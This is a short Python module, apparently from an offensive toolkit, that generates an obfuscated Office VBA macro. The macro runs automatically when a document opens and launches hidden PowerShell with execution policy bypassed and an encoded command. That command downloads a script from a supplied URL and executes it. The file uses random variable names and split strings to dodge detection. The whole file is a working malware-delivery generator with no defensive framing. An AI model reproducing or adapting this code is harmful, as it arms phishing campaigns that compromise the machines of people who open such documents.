#!/usr/bin/env python3
import base64
from ..utils.obfuscation import VBAObfuscator

class PowerShellCradleMacro:
    """Generate macro with PowerShell download cradle"""
    
    def __init__(self, payload_url):
        self.payload_url = payload_url
        self.obf = VBAObfuscator()
    
    def generate(self):
        """Create PowerShell download cradle macro"""
        # Generate random variable names
        func_name = self.obf.random_var()
        var_shell = self.obf.random_var()
        var_cmd = self.obf.random_var()
        
        # Create PowerShell command
        ps_command = f"IEX(New-Object Net.WebClient).DownloadString('{self.payload_url}')"
        encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
        
        macro = self.obf.create_auto_open_stubs(func_name)
        
        macro += f'''
Private Sub {func_name}()
    On Error Resume Next
    
    Dim {var_shell} As Object
    Dim {var_cmd} As String
    
    Set {var_shell} = CreateObject("WScript.Shell")
    
    {var_cmd} = "po" & "we" & "rs" & "he" & "ll.e" & "xe -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
    
    {var_shell}.Run {var_cmd}, 0, False
End Sub
'''
        return macro.strip()